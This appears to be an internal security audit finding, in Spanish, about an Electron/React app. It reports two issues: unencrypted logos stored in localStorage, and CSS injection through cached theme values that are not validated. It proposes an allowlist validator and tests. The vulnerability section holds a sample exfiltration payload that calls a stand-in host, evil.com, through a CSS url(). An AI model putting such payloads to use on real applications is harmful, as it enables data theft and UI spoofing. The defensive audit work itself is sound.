# SEC-016 — `localStorage` guarda logos (imagen) y valores CSS de tema (vector CSS injection)

- **Severidad:** P3 (Baja)
- **Categoría:** Data Exposure / CSS Injection (CWE-922 / CWE-79 variante CSS)
- **Archivos afectados:** `frontend/src/components/preview-panel/PreviewPanelView.tsx:45-60` (logos), `frontend/src/main.tsx:9-16` + `frontend/public/theme-init.js:7-9` (theme CSS cache), `frontend/src/components/settings/AppearanceView.tsx:303-306`

## Vulnerabilidad

1. **Logos en `localStorage`:** `antares_preview_logo_left/right` guardan `{ dataUrl, fileName }` (imágenes del usuario en base64) en disco sin cifrar. Cualquier proceso con acceso al perfil Electron los lee.

2. **Tema CSS sin validación de valores:** `hc_theme_css_cache` restaura variables CSS:
   ```js
   // main.tsx / theme-init.js
   const cache = JSON.parse(localStorage.getItem('hc_theme_css_cache') || '{}');
   for (const [key, value] of Object.entries(cache)) {
     if (key.startsWith('--')) document.documentElement.style.setProperty(key, value);
     //                                                    ↑ value NO validado
   }
   ```
   Solo se valida que `key` empiece con `--`. El `value` se inyecta tal cual en `setProperty`. Otra app (o un perfil compartido, o malware con acceso al `localStorage`) puede escribir un valor malicioso como `var(--x); background: url(https://evil.com/leak?d=...)` o `@import url(...)`, que se aplica **antes de que React monte** (en `theme-init.js` inline). Combinado con `style-src 'unsafe-inline'` (SEC-011), esto permite exfiltración/UI spoofing vía CSS.

## Impacto

- Logos: imagen del usuario en disco sin cifrar (legible por otros procesos). Bajo.
- CSS injection: si `localStorage` es escrito por otra app/perfil, inyecta CSS que se aplica antes del monteo de React → exfiltración de datos vía `url()`/`@import` (con `style-src 'unsafe-inline'`) o UI spoofing. Requiere escritura en `localStorage` (otra app con acceso al perfil, no remoto). P3.

## Fix propuesto (aditivo, conserva la funcionalidad de temas y logos)

1. **Validar valores de tema contra allowlist** en `main.tsx` y `theme-init.js`:
   ```js
   // frontend/src/utils/themeValidate.ts (nuevo, compartido)
   const COLOR_RE = /^(#[0-9a-f]{3,8}|rgba?\([^;]+\)|hsla?\([^;]+\)|[a-z]+)$/i;
   const LENGTH_RE = /^-?\d+(\.\d+)?(px|rem|em|%|vh|vw|pt)?$/i;
   const ALLOWED = { '--hc-accent': COLOR_RE, '--hc-radius': LENGTH_RE /* , ...mapear vars conocidas */ };

   export function safeThemeValue(key, value) {
     if (typeof key !== 'string' || !key.startsWith('--')) return null;
     if (typeof value !== 'string' || value.length > 64) return null;
     const re = ALLOWED[key];
     if (!re) return null;                 // solo variables conocidas
     return re.test(value.trim()) ? value.trim() : null;
   }
   ```
   Aplicar:
   ```js
   for (const [key, value] of Object.entries(cache)) {
     const safe = safeThemeValue(key, value);
     if (safe !== null) document.documentElement.style.setProperty(key, safe);
   }
   ```
   > Conserva la funcionalidad de temas: solo se aceptan valores válidos (colores/longitudes) para variables conocidas. Valores maliciosos (`url(...)`, `@import`, `;`) se rechazan.

2. **Logos:** mover el almacenamiento a IndexedDB con opt-in, o guardar solo la **ruta local** (vía `electronAPI`) en lugar del `dataUrl` en `localStorage`; añadir un botón "Borrar caché de logos" en Settings. Como mínimo, sanitizar `fileName` (ya lo hace el flujo de upload normalmente) y no persistir `dataUrl` si el logo excede un tamaño. Alternativa simple: dejarlo en `localStorage` pero documentarlo, y añadir el botón de borrado (control del usuario).

> El punto 1 (validación de tema) es el que cierra el vector CSS injection y es aditivo. El punto 2 es mejora de UX/privacidad, opcional.

## Testing (sin romper nada)

1. **`frontend/src/components/settings/AppearanceView.test.tsx`** (existe) — aplicar un tema válido → los colores cambian (happy path intacto).
2. **Nuevo test `themeValidate.test.ts`:** valores `#abc`, `rgba(0,0,0,0.5)`, `8px` → aceptados; `red; background:url(x)`, `@import url(x)`, `var(--x)`, valor de 200 chars → rechazados (null).
3. **Test de integración:** pre-poblar `localStorage.hc_theme_css_cache` con un payload CSS malicioso, montar `App` → el payload **no** se aplica (verificar `documentElement.style` no contiene la `url()`). El tema legítimo sigue aplicándose.
4. **Logos:** `frontend/src/components/preview-panel/PreviewPanelView.test.tsx` — guardar/cargar logo funciona; botón "borrar caché" vacía las claves.
